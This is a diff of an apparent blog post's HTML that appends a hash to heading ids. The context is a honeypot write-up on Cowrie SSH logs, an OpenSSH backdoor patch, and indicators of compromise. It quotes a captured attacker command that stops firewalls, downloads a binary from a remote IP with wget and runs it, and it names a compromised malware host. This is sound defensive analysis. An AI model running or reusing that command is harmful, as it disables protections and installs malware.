@@ -105,7 +105,7 @@
 </figure>
 
 
-<h2 id="cowrie-ssh">Cowrie ssh</h2>
+<h2 id="cowrie-ssh:b73d1f2643f2d600a6335e280f6f3b4f">Cowrie ssh</h2>
 
 <p>This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:</p>
 
@@ -171,7 +171,7 @@
 <pre><code>HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
 </code></pre>
 
-<h2 id="what-are-those-files">What are those files?!?</h2>
+<h2 id="what-are-those-files:b73d1f2643f2d600a6335e280f6f3b4f">What are those files?!?</h2>
 
 <p>Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:</p>
 
@@ -325,7 +325,7 @@ record_logout(pid_t pid, const char *ttyname, const char *user)
 
 <p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
 
-<h2 id="lets-do-threat-intelligence">Lets do Threat Intelligence</h2>
+<h2 id="lets-do-threat-intelligence:b73d1f2643f2d600a6335e280f6f3b4f">Lets do Threat Intelligence</h2>
 
 <p>So let&rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).</p>
 
@@ -361,7 +361,7 @@ record_logout(pid_t pid, const char *ttyname, const char *user)
 
 <p>The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&rsquo;t use any common framework (I contacted the owner, no answer yet).</p>
 
-<h2 id="iocs">IOCs</h2>
+<h2 id="iocs:b73d1f2643f2d600a6335e280f6f3b4f">IOCs</h2>
 
 <p>It&rsquo;s not the new super-duper fancy APT group attack, but I like how <a href="https://twitter.com/malware_traffic">Brad</a> ends <a href="http://www.malware-traffic-analysis.net/">his posts</a> with a summary of what to check on your system, so here is a short summary:</p>
 
